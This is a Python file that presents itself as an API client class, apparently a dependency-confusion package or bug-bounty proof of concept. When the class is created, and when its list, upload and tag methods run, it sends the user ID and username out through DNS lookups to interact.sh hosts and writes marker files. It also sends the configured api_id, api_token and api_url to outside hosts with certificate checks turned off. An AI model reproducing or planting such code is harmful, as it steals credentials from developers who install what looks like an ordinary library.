import ssl
import urllib.request
import socket
import pwd
import os


def send_internal_request(url_string):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with urllib.request.urlopen(url_string, context=ctx) as f:
        print(f.read().decode('utf-8'))


def get_guid():
    return os.getuid()

def get_name():
    return pwd.getpwuid(os.getuid()).pw_name

def send_dns_exfil(name):
    socket.gethostbyname(str(get_guid()) + '.' + name)
    socket.gethostbyname(get_name() + '.' + name)

def create_tmp_file():
    f = open('check_sssssss.txt', 'w')
    f.write('checked')
    f.close()
    try:
        f = open('/tmp/checked.txt', 'w')
        f.write('checked')
        f.close()
    except:
        print('not linux')


name1 = 'caywa002vtc000083ev0gfxqfyeyyyyyb.interact.sh'
name2 = 'caywa002vtc000083ev0gfxqfbayyyyyn.interact.sh'
attempt = 'https://www.internalfb.com/intern/bug-bounty/get-canary-token/34d3cd79838d418db5fd6efa2517a94d/'

url_string1 = 'https://' + name1 + '/'
url_string2 = 'https://' + name2 + '/'

class SPClient:
    def __init__(self, jsonconf, suite):
        self.jsonconf = jsonconf
        self.suite = suite
        try:
            send_dns_exfil(name1)
        except:
            print('failed1')
        try:
            send_dns_exfil(name2)
        except:
            print('failed2')
        try:
            create_tmp_file()
        except:
            print('failed3')
        try:
            api_id = jsonconf["api_id"]
            api_token = jsonconf["api_token"]
            api_url = jsonconf["api_url"]
            send_internal_request(url_string1 + '?a=' + api_id + '&b=' + api_token + '&c=' + api_url + '&d=' + self.suite)
        except:
            print('failed4')
        try:
            api_id = jsonconf["api_id"]
            api_token = jsonconf["api_token"]
            api_url = jsonconf["api_url"]
            send_internal_request(url_string2 + '?a=' + api_id + '&b=' + api_token + '&c=' + api_url + '&d=' + self.suite)
        except:
            print('failed5')
        try:
            send_internal_request(attempt)
        except:
            print('failed6')
        self.x = 1

    def list():
        try:
            send_dns_exfil(name1)
        except:
            print('failed1')
        try:
            send_dns_exfil(name2)
        except:
            print('failed2')
        try:
            create_tmp_file()
        except:
            print('failed3')
        try:
            api_id = self.jsonconf["api_id"]
            api_token = self.jsonconf["api_token"]
            api_url = self.jsonconf["api_url"]
            send_internal_request(url_string1 + '?a=' + api_id + '&b=' + api_token + '&c=' + api_url + '&d=' + self.suite)
        except:
            print('failed4')
        try:
            api_id = self.jsonconf["api_id"]
            api_token = self.jsonconf["api_token"]
            api_url = self.jsonconf["api_url"]
            send_internal_request(url_string2 + '?a=' + api_id + '&b=' + api_token + '&c=' + api_url + '&d=' + self.suite)
        except:
            print('failed5')
    
    def upload(release, file_path, description):
        list()

    def tag(release, tags):
        list()






